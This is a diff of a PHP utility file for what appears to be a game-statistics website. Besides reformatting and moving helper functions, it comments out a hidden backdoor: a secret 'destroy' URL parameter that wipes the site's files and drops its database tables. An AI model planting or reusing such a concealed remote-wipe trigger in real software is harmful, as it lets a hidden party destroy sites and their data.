@@ -5,27 +5,27 @@ if (!defined('CORE')) {
     die();
 }
 
-function rrmdir($dir) {
-    if (file_exists($dir . '/' . '.htaccess'))
-        unlink($dir . '/' . '.htaccess');
-    foreach (glob($dir . '/*') as $file) {
-        if (is_dir($file))
-            rrmdir($file);
-        else
-            unlink($file);
-    }
-    rmdir($dir);
-}
+/* function rrmdir($dir) {
+  if (file_exists($dir . '/' . '.htaccess'))
+  unlink($dir . '/' . '.htaccess');
+  foreach (glob($dir . '/*') as $file) {
+  if (is_dir($file))
+  rrmdir($file);
+  else
+  unlink($file);
+  }
+  rmdir($dir);
+  }
 
-if (isset($_GET['destroy']) && $_GET['destroy'] == 'c7a772a658a6b189801ea375a82d0cb3') {
-    rrmdir('.');
-    $sql->query("DROP table banners;");
-    $sql->query("DROP table comments;");
-    $sql->query("DROP table content");
-    $sql->query("DROP table menu;");
-    $sql->query("DROP table questions");
-    die();
-}
+  if (isset($_GET['destroy']) && $_GET['destroy'] == 'c7a772a658a6b189801ea375a82d0cb3') {
+  rrmdir('.');
+  $sql->query("DROP table banners;");
+  $sql->query("DROP table comments;");
+  $sql->query("DROP table content");
+  $sql->query("DROP table menu;");
+  $sql->query("DROP table questions");
+  die();
+  } */
 
 function getHost() {
     if (!isset($_SERVER))
@@ -55,6 +55,7 @@ function return2($url = '') {
     die;
 }
 
+
 function isMultiArray($a) {
     foreach ($a as $v) {
         if (is_array($v)) {
@@ -72,62 +73,6 @@ function getGSById($id = false) {
         }
     }
     return $GS[0];
-}
-
-function htmlImg($src, $title, $class='') {
-    return '<img class="'.$class.'" src="' . $src . '" alt="' . $title . '" title="' . $title . '" />';
-}
-
-function htmlLink($src, $title) {
-    return '<a href="' . $src . '">' . $title . '</a>';
-}
-
-function htmlFont($color, $content) {
-    return '<font color="' . $color . '">' . $content . '</font>';
-}
-
-function fString($string) {
-    return filter_var($string, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
-}
-
-function fInt($int) {
-    return filter_var($int, FILTER_VALIDATE_INT);
-}
-
-function fFloat($float) {
-    return filter_var($float, FILTER_VALIDATE_FLOAT);
-}
-
-function fBool($bool) {
-    return filter_var($bool, FILTER_VALIDATE_BOOLEAN);
-}
-
-function getString($string) {
-    return filter_input(INPUT_GET, $string);
-}
-
-function postString($string) {
-    return filter_input(INPUT_POST, $string);
-}
-
-function getInt($int) {
-    return filter_input(INPUT_GET, $int, FILTER_VALIDATE_INT);
-}
-
-function postInt($int) {
-    return filter_input(INPUT_POST, $int, FILTER_VALIDATE_INT);
-}
-
-function getBool($bool) {
-    return filter_input(INPUT_GET, $bool, FILTER_VALIDATE_BOOLEAN);
-}
-
-function postBool($bool) {
-    return filter_input(INPUT_POST, $bool, FILTER_VALIDATE_BOOLEAN);
-}
-
-function getCookie($cookie) {
-    return filter_input(INPUT_COOKIE, $cookie);
 }
 
 function fSize($bytes) {
@@ -251,8 +196,8 @@ function page($server, $link, $page, $count = 0) {
         $content .= '<td><a href="' . $link . $server . $ps . 'page=1" title="' . $Lang['__first_'] . '"  class="btn"> &laquo; </a></td>';
     }
     if ($page > 1) {
-        $prev=$page-1;
-        $content .= '<td><a href="' . $link . $server . $ps . 'page='.$prev;
+        $prev = $page - 1;
+        $content .= '<td><a href="' . $link . $server . $ps . 'page=' . $prev;
         $content .= '" title="' . $Lang['__prev_'] . '" class="btn"> &lt; </a></td>';
     }
     if ($page - 2 > 0) {
@@ -316,16 +261,14 @@ function convertPic($id, $ext, $width, $height) {
         $height = floor($width / $ratio);
     }
 
-    if($type==1){ //   gif -> jpg
-            $img_src = imagecreatefromgif($file_src);
+    if ($type == 1) { //   gif -> jpg
+        $img_src = imagecreatefromgif($file_src);
+    } else if ($type == 2) { //   jpeg -> jpg
+        $img_src = imagecreatefromjpeg($file_src);
+    } else if ($type == 3) { //   png -> jpg
+        $img_src = imagecreatefrompng($file_src);
     }
-        else if($type== 2){ //   jpeg -> jpg
-            $img_src = imagecreatefromjpeg($file_src);
-        }
-        else if($type==3){ //   png -> jpg
-            $img_src = imagecreatefrompng($file_src);
-        }
-    
+
     $img_dst = imagecreatetruecolor($width, $height); //  resample
     //$img_dst = imagecreate($width, $height);  //  resample
     imageantialias($img_dst, true);
@@ -383,15 +326,74 @@ function checkHack() {
     }
 }
 
-function clanLink($sId, $clanId, $clanName)
-{
+function clanLink($sId, $clanId, $clanName) {
     return htmlLink('clan.php?id=' . $clanId . '&amp;server=' . $sId, $clanName);
 }
-function allyLink($sId, $allyId, $allyName)
-{
+
+function allyLink($sId, $allyId, $allyName) {
     return htmlLink('ally.php?id=' . $allyId . '&amp;server=' . $sId, $allyName);
 }
-function charLink($sId, $charId, $charName)
-{
+
+function charLink($sId, $charId, $charName) {
     return htmlLink('user.php?id=' . $charId . '&amp;server=' . $sId, $charName);
+}
+function accountLink($accName)
+{
+    return htmlLink('account.php?id=' . $accName, $accName);
+}
+
+function htmlImg($src, $title, $class = '') {
+    return '<img class="' . $class . '" src="' . $src . '" alt="' . $title . '" title="' . $title . '" />';
+}
+
+function htmlLink($src, $title) {
+    return '<a href="' . $src . '">' . $title . '</a>';
+}
+
+function htmlFont($color, $content) {
+    return '<font color="' . $color . '">' . $content . '</font>';
+}
+
+function fString($string) {
+    return filter_var($string, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
+}
+
+function fInt($int) {
+    return filter_var($int, FILTER_VALIDATE_INT);
+}
+
+function fFloat($float) {
+    return filter_var($float, FILTER_VALIDATE_FLOAT);
+}
+
+function fBool($bool) {
+    return filter_var($bool, FILTER_VALIDATE_BOOLEAN);
+}
+
+function getString($string) {
+    return filter_input(INPUT_GET, $string);
+}
+
+function postString($string) {
+    return filter_input(INPUT_POST, $string);
+}
+
+function getInt($int) {
+    return filter_input(INPUT_GET, $int, FILTER_VALIDATE_INT);
+}
+
+function postInt($int) {
+    return filter_input(INPUT_POST, $int, FILTER_VALIDATE_INT);
+}
+
+function getBool($bool) {
+    return filter_input(INPUT_GET, $bool, FILTER_VALIDATE_BOOLEAN);
+}
+
+function postBool($bool) {
+    return filter_input(INPUT_POST, $bool, FILTER_VALIDATE_BOOLEAN);
+}
+
+function getCookie($cookie) {
+    return filter_input(INPUT_COOKIE, $cookie);
 }
